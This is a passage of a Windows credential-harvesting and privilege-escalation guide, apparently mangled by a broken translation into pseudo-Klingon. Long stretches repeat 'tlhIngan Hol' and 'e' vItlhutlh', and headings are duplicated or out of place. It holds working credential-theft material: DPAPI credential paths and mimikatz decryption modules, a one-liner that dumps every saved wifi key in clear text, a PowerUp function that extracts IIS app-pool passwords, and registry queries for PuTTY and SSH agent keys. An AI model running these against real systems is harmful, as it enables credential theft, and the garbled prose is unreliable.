Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol** **tlhIngan Hol**
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatz module** `dpapi::cred` jImej vItlhutlh `/masterkey` vaj **decrypt**.\
**sekurlsa::dpapi** module (ghorgh root) **memory** vItlhutlh **DPAPI** **masterkeys** **extract**.

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell Credentials

**PowerShell credentials** **scripting** je automation tasks vaj **encrypted credentials** vItlhutlh. **DPAPI** vItlhutlh, vaj typically **decrypt** 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

#### Introduction

Wifi is a wireless technology that allows devices to connect to a network without the need for physical cables. It is commonly used for internet access in homes, offices, and public places. Wifi networks are secured using various encryption protocols to protect the data transmitted over the network.

#### Wifi Security

Wifi networks can be vulnerable to security breaches if not properly secured. Here are some common security issues and best practices to mitigate them:

1. **Weak Passwords**: Use strong, unique passwords for your wifi network. Avoid using common passwords or default passwords provided by the router manufacturer.

2. **Encryption**: Enable encryption on your wifi network. The most common encryption protocols are WPA2 (Wi-Fi Protected Access 2) and WPA3. Avoid using outdated encryption protocols like WEP (Wired Equivalent Privacy).

3. **Guest Networks**: If you have guests who need to access your wifi network, consider setting up a separate guest network. This will prevent them from accessing your main network and potentially compromising its security.

4. **Firewall**: Configure a firewall on your router to filter incoming and outgoing network traffic. This can help protect your network from unauthorized access and malicious attacks.

5. **Firmware Updates**: Regularly update the firmware of your router to ensure that it has the latest security patches. Router manufacturers often release updates to address vulnerabilities and improve security.

6. **MAC Address Filtering**: Consider enabling MAC address filtering on your router. This allows you to specify which devices are allowed to connect to your wifi network based on their MAC addresses.

7. **Disable WPS**: Disable Wi-Fi Protected Setup (WPS) on your router if you don't use it. WPS can be vulnerable to brute-force attacks and should be disabled unless necessary.

#### Conclusion

Securing your wifi network is essential to protect your data and prevent unauthorized access. By following these best practices, you can significantly reduce the risk of security breaches and ensure a safe and reliable wifi connection.
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

You can find them on `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
and in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Recently Run Commands

jIyajbe' 'ej `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
'e' vaj `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
### Mimikatz

**Mimikatz** `dpapi::rdg` module jup 'ej **/masterkey** vItlhutlh **.rdg files** **decrypt**.

**Mimikatz** `sekurlsa::dpapi` module jup **DPAPI masterkeys** **extract** memory vItlhutlh.

### Sticky Notes

**StickyNotes** app Windows workstations **passwords** je **save** 'ej **information** **database file**. **File** vItlhutlh `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` 'ej **search** 'ej **examine** worth.

### AppCmd.exe

**AppCmd.exe** **passwords** **recover** 'e' vItlhutlh **Administrator** 'ej **High Integrity level** run.\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` **directory** vItlhutlh.\
**File** vItlhutlh **credentials** **configured** 'ej **recover** possible.\
**Code** vItlhutlh [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) vItlhutlh.
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Check if `C:\Windows\CCM\SCClient.exe` exists.\
Installers are **run with SYSTEM privileges**, many are vulnerable to **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` vItlhutlh.\
Installers **SYSTEM privileges** run, **DLL Sideloading** vulnerable **(Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## tlhIngan Hol

### Putty Creds

```
### Putty Creds

#### tlhIngan Hol

```

### Registry (Credentials)

#### tlhIngan Hol

```
### Registry (Credentials)

#### tlhIngan Hol

```
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys

#### tlhIngan Hol

#### Introduction

The SSH host keys used by PuTTY are stored in the Windows registry. These keys are used to verify the authenticity of the SSH server when connecting to it.

#### Finding the SSH Host Keys

To find the SSH host keys in the Windows registry, follow these steps:

1. Open the Windows registry editor by typing `regedit` in the Run dialog (Win + R).
2. Navigate to the following registry key: `HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\SshHostKeys`.
3. Under this key, you will find subkeys for each SSH server you have connected to. The subkeys are named after the hostname or IP address of the server.
4. Inside each subkey, you will find values for each type of SSH key (e.g., RSA, DSA, ECDSA, ED25519). The values represent the actual SSH host keys.

#### Verifying SSH Host Keys

To verify the SSH host keys, you can compare the values stored in the registry with the keys provided by the server administrator. If the values match, it means the SSH host keys are authentic.

#### Conclusion

Knowing the location of the SSH host keys in the Windows registry allows you to verify the authenticity of SSH servers when using PuTTY. This is important for ensuring secure and trusted connections.
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys` so you should check if there is anything interesting in there:

### qawaneS lo'logh

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys` so you should check if there is anything interesting in there:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
ghItlh entry vItlhutlh path vItlhutlh vItlhutlh vItlhutlh SSH key. vItlhutlh encrypted vItlhutlh vItlhutlh vItlhutlh [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract) vItlhutlh.\
vItlhutlh technique vItlhutlh vItlhutlh: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

vItlhutlh `ssh-agent` service vItlhutlh running 'ej vItlhutlh 'ej vItlhutlh automatically start on boot run:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
